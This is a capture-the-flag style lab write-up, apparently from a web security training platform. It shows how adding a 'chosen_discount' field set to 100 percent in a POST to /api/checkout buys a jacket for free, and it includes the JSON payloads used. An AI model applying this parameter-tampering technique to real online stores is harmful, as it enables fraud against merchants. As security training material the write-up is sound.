# 🧪 Lab: Finding and Exploiting an Unused API Endpoint

## 📋 Lab Description

**Goal:**  
Exploit a hidden API endpoint to purchase a **Lightweight l33t Leather Jacket** using the credentials `wiener:peter`.

**Level:** Practitioner  
**Status:** ✅ *Completed*

---

## 🔍 Phase 1: Reconnaissance

- Logged in using the provided credentials: `wiener:peter`
- Explored the application to identify visible functionality
- Captured and reviewed HTTP requests using Burp Suite
- Identified existing endpoints, such as:
  - `/api/products`
  - `/api/user/cart`
- Noticed the API request GET `/api/checkout` used for the checkout contain a JSON object

  ```
  {
        "chosen_discount":{
            "percentage":0
            },
        "chosen_products":[
            {
                "product_id":"1",
                "name":"Lightweight \"l33t\" Leather Jacket","quantity":1,
                "item_price":133700
            }
        ]
    }
  ```

---

## 🧪 Phase 2: Testing & Errors

- Tried changing the API request: I sent POST `/api/checkout` adding `chosen_discount` as a parameter in the json object--> No error retrived 
```
{
        "chosen_products":[
            {
                "product_id":"1",
                "quantity":1,
            }
        ]
    }
```
--->
```
{
        "chosen_discount":{
            "percentage":0
            },
        "chosen_products":[
            {
                "product_id":"1",
                "quantity":1,
            }
        ]
    }
```
- Tried to change the value of the `percentage` in a char --> got the error invalid value

---

## 🎯 Phase 3: Exploitation

- I sent a POST `/api/checkout` with the payload to get a 100% discount for the article: 

```
{
        "chosen_discount":{
            "percentage":100
            },
        "chosen_products":[
            {
                "product_id":"1",
                "quantity":1,
            }
        ]
    }
```
